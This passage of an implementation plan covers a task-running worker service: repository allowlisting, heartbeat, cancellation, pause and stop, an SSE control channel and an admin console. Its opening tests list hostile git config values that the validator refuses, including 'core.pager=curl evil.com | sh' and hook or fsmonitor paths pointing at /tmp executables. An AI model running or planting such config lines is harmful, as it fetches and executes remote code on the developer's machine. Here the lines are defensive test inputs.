    "core.pager=curl evil.com | sh",
    "core.fsmonitor=/tmp/x",
    "core.sshCommand=/tmp/x",
    "core.hooksPath=/tmp/hooks",
    "diff.external=/tmp/x",
    "filter.lfs.clean=/tmp/x",
    "alias.st=!/tmp/x",
  ])("refuses a repository whose git config sets %s", async (line) => {
    const result = await bindRepository(depsWith({ gitConfig: `${line}\n` }), "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/git config/i);
  });

  it.each([
    ["/Users/rpo/.ssh", "sensitive directory"],
    ["/etc", "sensitive directory"],
    ["/repo/node_modules/x", "node_modules"],
    ["relative/path", "absolute"],
    ["/a/../b", "absolute"],
  ])("refuses %s outright", async (path) => {
    const result = await bindRepository(depsWith({ allowlist: [path] }), path);

    expect(result.ok).toBe(false);
  });

  it("refuses a repository that is not its own toplevel", async () => {
    const deps = depsWith({ toplevel: "/repo-parent" });

    expect((await bindRepository(deps, "/repo")).ok).toBe(false);
  });

  it("refuses a repository owned by another user", async () => {
    expect((await bindRepository(depsWith({ fileUid: 0 }), "/repo")).ok).toBe(false);
  });

  it("refuses a group-writable repository", async () => {
    expect((await bindRepository(depsWith({ mode: 0o775 }), "/repo")).ok).toBe(false);
  });

  it("refuses an allowlist file readable by anyone else", async () => {
    const deps = depsWith();
    deps.readAllowlist = () => {
      throw new Error("~/.claudeplanner/repos.json is readable by group or others");
    };

    const result = await bindRepository(deps, "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/readable by group or others/);
  });

  // A hostile system-wide gitconfig would otherwise reach every invocation this module makes
  it("neutralises system and repository git config on every call it makes", async () => {
    const deps = depsWith();
    await bindRepository(deps, "/repo");

    for (const call of (deps.runner.run as ReturnType<typeof vi.fn>).mock.calls) {
      expect(call[1]).toEqual(expect.arrayContaining(["-c", "core.pager=cat"]));
      expect(call[2].env.GIT_CONFIG_NOSYSTEM).toBe("1");
    }
  });
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `cd worker && npx vitest run src/repos.test.ts`
Expected: FAIL — cannot resolve `./repos.js`.

- [ ] **Step 3: Implement**

Rules in order, refusing with a reason at the first failure: absolute and free of `..`; present verbatim in the allowlist; `realpath` returns the same path; not under `~/Library`, `~/.ssh`, `~/.config`, `~/.claude`, `/etc`, `/System`, `/private/var`, and no `node_modules` segment; owned by `deps.uid` and not group- or world-writable; `git rev-parse --show-toplevel` returns the path itself; `git config --local --list` sets none of the executable keys.

Every `runner.run` from this module passes `env: { ...childEnv(), GIT_CONFIG_NOSYSTEM: "1" }` and prepends `["-c", "core.fsmonitor=false", "-c", "core.pager=cat"]` to its args.

`worktreeRoot` is **derived**, never taken from configuration: `join(dirname(path), "cp-worktrees", workerId)`. Per worker, because `reapOrphans` force-removes everything under its root (`worker/src/workspace.ts:15-26`) and two workers sharing a root would destroy each other's live worktrees.

The allowlist is read through the same mode check `config.ts` already uses for the token file — refuse to read `repos.json` if it is group- or world-readable, as `ssh` refuses a loose key.

- [ ] **Step 4: Run to verify it passes**

Run: `cd worker && npx vitest run src/repos.test.ts`
Expected: all passing.

- [ ] **Step 5: Commit**

```bash
git add worker/src/repos.ts worker/src/repos.test.ts
git commit -m "feat(worker): a repository path is a locally consented capability (CP-161)"
```

---

### Task 7: `registration.ts` — identity on the worker side

This task ends the breaking window opened by Task 4.

**Files:**
- Create: `worker/src/registration.ts`, `worker/src/registration.test.ts`
- Modify: `worker/src/api.ts`, `worker/README.md`, `worker/launchd/com.claudeplanner.worker.plist`

**Interfaces:**
- Produces:
  - `loadIdentity(store): { workerId: string; credential: string } | null`
  - `startHeartbeat(deps): { stop(): void; onAbort(cb: () => void): void; ack(command: string): void }`
- Modifies: `send(path, method, body, credential: "api" | "worker")` in `api.ts`

- [ ] **Step 1: Write the failing test**

Cover, at minimum:

```ts
it("reuses a stored identity instead of registering again", async () => { /* register not called */ });
it("persists the credential at mode 0600", async () => { /* store.write called with { mode: 0o600 } */ });
it("aborts the run in flight when the heartbeat is refused", async () => {
  const onAbort = vi.fn();
  const heartbeat = startHeartbeat(depsWith({ status: 403 }));
  heartbeat.onAbort(onAbort);
  await heartbeat.tick();
  expect(onAbort).toHaveBeenCalled();
});
// A network blip is not a kill switch
it("does not abort when the heartbeat merely fails to reach the server", async () => {
  const onAbort = vi.fn();
  const heartbeat = startHeartbeat(depsWith({ throws: new Error("ECONNREFUSED") }));
  heartbeat.onAbort(onAbort);
  await heartbeat.tick();
  expect(onAbort).not.toHaveBeenCalled();
});
it("echoes the command it applied, so the console can stop saying Pausing", async () => { /* ack in body */ });
```

- [ ] **Step 2: Run to verify it fails, then implement**

Identity lives at `<stateDir>/worker.json`, mode `0600`. Registration runs only when that file is absent or its credential is rejected with 401. The heartbeat interval comes from `heartbeatMs` in the registration response (`WORKER_HEARTBEAT_MS`), never a locally chosen number that could race the staleness window.

In `api.ts`, `send` gains a credential selector. Only `/tasks/claim` and `/api/workers/**` use `"worker"`; everything else keeps `CP_API_TOKEN`. Every worker-credential request sends `X-Worker-Id` and `X-CP-Protocol`. A 401 from the claim logs once: `this worker is not registered — see worker/README.md`.

- [ ] **Step 3: Update the deployment surface**

`worker/README.md`: the variables table loses `CP_PROJECT_ID` and `CP_REPO_PATH` as required, gains `CP_WORKER_NAME`; a new *Registration* section explains that an instance admin registers the worker and assigns it a project, and that the repository path must be approved locally in `repos.json`. The claim on line 51 that `CP_PROJECT_ID` accepts a key or an ObjectId is deleted — the variable is gone.

The plist drops `CP_PROJECT_ID` and `CP_REPO_PATH` and keeps `CP_API_URL`, `CP_API_TOKEN_FILE` and `CP_STATE_DIR`.

- [ ] **Step 4: Run the worker suite**

Run: `cd worker && npx vitest run && npm run build`
Expected: all passing.

- [ ] **Step 5: Commit**

```bash
git add worker/src/registration.ts worker/src/registration.test.ts worker/src/api.ts worker/README.md worker/launchd
git commit -m "feat(worker): server-assigned identity and heartbeat (CP-161)"
```

---

### Task 8: `AbortSignal` — make the kill switch reach a running task

**Files:**
- Modify: `worker/src/exec.ts`, `worker/src/pipeline.ts`, `worker/src/main.ts` and their tests

**Interfaces:**
- Produces: `RunOpts.signal?: AbortSignal`, `RunOpts.stdin?: string`, `PipelineDeps.signal?: AbortSignal`

- [ ] **Step 1: Write the failing test**

```ts
it("kills a running command when the signal aborts", async () => {
  const controller = new AbortController();
  const running = createRunner().run(process.execPath, ["-e", "setInterval(() => {}, 1000)"], {
    cwd: process.cwd(),
    timeoutMs: 60_000,
    signal: controller.signal,
  });

  controller.abort();

  expect((await running).code).not.toBe(0);
});

it("passes a prompt on stdin rather than argv, where any process could read it", async () => {
  const result = await createRunner().run(
    process.execPath,
    ["-e", "process.stdin.on('data', d => process.stdout.write(d))"],
    { cwd: process.cwd(), timeoutMs: 10_000, stdin: "secret-prompt" }
  );

  expect(result.stdout).toContain("secret-prompt");
});

it("stops between phases without starting the next gate", async () => {
  const controller = new AbortController();
  const later = { name: "build", run: vi.fn() };
  const first = {
    name: "diff-size",
    run: vi.fn(async () => {
      controller.abort();
      return { ok: true, reason: "" };
    }),
  };
  const h = harness({ gates: [first, later], signal: controller.signal });

  await runTask(h.deps, task);

  expect(later.run).not.toHaveBeenCalled();
  expect(h.reporter.released).toHaveBeenCalled();
});
```

- [ ] **Step 2: Implement**

`spawn` accepts `signal` directly; `stdio` becomes `["pipe", "pipe", "pipe"]` and the runner writes and ends stdin when `opts.stdin` is set. `pipeline.ts` checks `deps.signal?.aborted` before each gate and before delivery.

**An aborted run reports through `reporter.released`, not `reporter.requeued`.** `requeued` charges the attempt (`worker/src/reporter.ts:105-112`); an operator's decision is not the task's failure, and three stops would otherwise park the task in review as "gave up".

- [ ] **Step 3: Wire it in `main.ts`**

Without this the abort verdict has nowhere to go, and a locked worker finishes its run and merges to `main`:

```ts
const heartbeat = startHeartbeat({ api, config, stateDir: config.stateDir });
let current: AbortController | null = null;
heartbeat.onAbort(() => current?.abort());

const loop = createLoop({
  config,
  api,
  execute: (task) => {
    current = new AbortController();
    return runTask({ ...deps, signal: current.signal }, task).finally(() => {
      current = null;
    });
  },
  drain,
  sleep,
});
```

- [ ] **Step 4: Run and commit**

Run: `cd worker && npx vitest run && npm run build`

```bash
git add worker/src
git commit -m "feat(worker): cancellable runs, reaching a task already in flight (CP-161)"
```

---

### Task 9: Pause, and stop that stays stopped

**Files:**
- Modify: `worker/src/loop.ts`, `worker/src/loop.test.ts`

**Interfaces:**
- Produces: `Loop.pause()`, `Loop.resume()`, `Loop.paused(): boolean`

- [ ] **Step 1: Write the failing test**

The default `sleep` in `loopOver` stops the loop, which would let a vacuous test pass whether or not `pause()` does anything. These count cycles instead:

```ts
it("claims nothing more once paused mid-task", async () => {
  const api = apiStub(queue(task, { ...task, taskId: "t2" }));
  let cycles = 0;
  const loop = createLoop({
    config,
    api,
    execute: async () => {
      loop.pause();
    },
    sleep: async () => {
      cycles += 1;
      if (cycles >= 3) loop.stop();
    },
    log: vi.fn(),
  });

  await loop.start();

  expect(api.claim).toHaveBeenCalledTimes(1);
  expect(cycles).toBeGreaterThanOrEqual(3);
});

it("resumes claiming after resume", async () => {
  const api = apiStub(queue(task));
  let cycles = 0;
  const loop = createLoop({
    config,
    api,
    execute: vi.fn().mockResolvedValue(undefined),
    sleep: async () => {
      cycles += 1;
      if (cycles === 1) loop.resume();
      if (cycles >= 3) loop.stop();
    },
    log: vi.fn(),
  });
  loop.pause();

  await loop.start();

  expect(api.claim).toHaveBeenCalled();
});
```

- [ ] **Step 2: Implement**

A paused loop sleeps without claiming. `stop` from the control channel calls `pause()` as well as aborting — otherwise the release refunds the attempt, the loop `continue`s without sleeping, `claim` sorts by `{order, createdAt}` and hands back the same task: a restart, not a stop.

- [ ] **Step 3: Run and commit**

```bash
git add worker/src/loop.ts worker/src/loop.test.ts
git commit -m "feat(worker): pause, and stop that stays stopped (CP-161)"
```

---

### Task 10: `control.ts` — the SSE command channel

**Files:**
- Create: `worker/src/control.ts`, `worker/src/control.test.ts`, `src/app/api/workers/[workerId]/stream/route.ts`, `src/lib/worker-events.ts`

**Interfaces:**
- Produces: `connectControl(deps): { close(): void }`; server-side `publishToWorker(workerId, event)`

- [ ] **Step 1: The server needs a way to reach an open stream**

`pm/chat/route.ts` streams events its own handler produces. This stream must deliver an event produced by a *different* request — the admin's `POST .../command`. Without deciding this, an implementer writes a stream that never emits, or reinvents polling.

`src/lib/worker-events.ts` holds a module-level `Map<string, ReadableStreamDefaultController>`; the stream route registers on open and deletes on close; the command route calls `publishToWorker`. **This works within one server process only.** On more than one Railway replica a command may be published on a replica the worker is not connected to — which is why the heartbeat also carries `command`, and why the heartbeat, not the stream, is the contract. The stream is an accelerator.

State that limitation in the module's one comment.

- [ ] **Step 2: Write the failing test for the client**

Driven by a synthetic `ReadableStream`, never a network: a `command` frame calls the matching handler; a malformed frame is skipped rather than throwing; `: ping` comments are ignored; the stream ending schedules a reconnect with backoff and does not throw into the run loop.

- [ ] **Step 3: Implement both sides**

The route mirrors `pm/chat/route.ts`, including `: ping` every 15 seconds — without it a proxy cuts an idle stream silently and the degradation to polling goes unnoticed.

- [ ] **Step 4: Run and commit**

```bash
git add worker/src/control.ts worker/src/control.test.ts src/lib/worker-events.ts "src/app/api/workers/[workerId]/stream"
git commit -m "feat(worker): server-pushed commands over SSE (CP-161)"
```

---

### Task 11: Policy from the server

**Files:**
- Modify: `worker/src/config.ts`, `worker/src/config.test.ts`, `worker/src/main.ts`, `worker/src/api.ts`

**Interfaces:**
- Produces: `loadBootstrap(env, readSecret): Bootstrap`, `EffectiveConfig`

- [ ] **Step 1: Write the failing test**

Cover: bootstrap needs only `CP_API_URL` plus a token and a state dir; `CP_REPO_PATH` and `CP_PROJECT_ID` are no longer required; policy from a registration response is adopted; a later `config` frame replaces it without a restart; an unknown field in a `config` frame is ignored rather than adopted; and a worker restarting with no registration response reads its record through `GET /api/workers/:id` (Task 5).

- [ ] **Step 2: Implement**

`createApiClient` currently builds its base URL from `config.projectId` (`worker/src/api.ts:73`). It becomes per-project: `claim(projectId, runId)` and the reporting calls take the project of the task they concern, which the claim response already identifies. Assignments come from the server, so a worker may serve more than one project — the loop iterates its assignments and claims from each in turn.

- [ ] **Step 3: Run and commit**

```bash
git add worker/src
git commit -m "feat(worker): policy from the server, env down to bootstrap (CP-161)"
```

---

### Task 12: `/admin/workers`

**Files:**
- Create: `src/app/admin/workers/page.tsx`

**Interfaces:**
- Consumes: `GET /api/admin/workers`, `PATCH /api/workers/:id`, `POST /api/workers/:id/command` (Task 5)

- [ ] **Step 1: Build the page**

Follow `src/app/admin/agents/page.tsx` exactly — same table shape, same save affordance. Columns: name, host, version, last seen with a stale badge, `bindingError` when set, enabled toggle, instance lock, and pause/resume/stop buttons.

**No phase column.** `Task.execution.phase` is part B; a column this plan cannot fill would render empty forever.

A command in flight renders "Pausing…" until `commandAckedAt` is newer than `commandIssuedAt`, then the applied state. Past a minute without acknowledgement it reads "not acknowledged for Xs". The console must never claim a worker is paused while it is still merging.

- [ ] **Step 2: Verify live**

Run the app locally against a seeded worker, toggle the lock, and confirm with `curl` that the claim endpoint then returns 403 **with the worker's SSE connection closed**.

- [ ] **Step 3: Commit**

```bash
git add src/app/admin/workers
git commit -m "feat(admin): worker fleet console (CP-161)"
```

---

## Verification for part A

On the CP-158 local rig, with the scratch repository under `~/cp-rig/` — **not** `/tmp` or `$TMPDIR`, both of which `repos.ts` refuses by design (`realpath("/tmp/x")` is `/private/tmp/x`, and `$TMPDIR` resolves under `/private/var`).

1. An admin registers a worker; it appears in `/admin/workers`; assigning it a project lets it claim.
2. Toggling the instance lock makes the next claim return 403 **with SSE disconnected** — proving enforcement is not on the push channel.
3. Locking a worker **mid-run** aborts the run within one heartbeat, and nothing merges.
4. A worker whose heartbeat stops is refused within `WORKER_STALE_MS`.
5. Pointing an assignment at a path outside the local allowlist leaves the worker idle with the reason visible in `/admin/workers`, and creates no worktree.
6. A repository carrying `core.pager` in its git config is refused before any command runs in it.
7. Stop during a build aborts within seconds, does not reclaim the same task, and does not charge an attempt.
8. Pausing shows "Pausing…" in the console until the worker acknowledges, then "Paused".

Parts B (telemetry and the live view) and C (the menubar app) get their own plans, each written after the part before it has been reviewed.
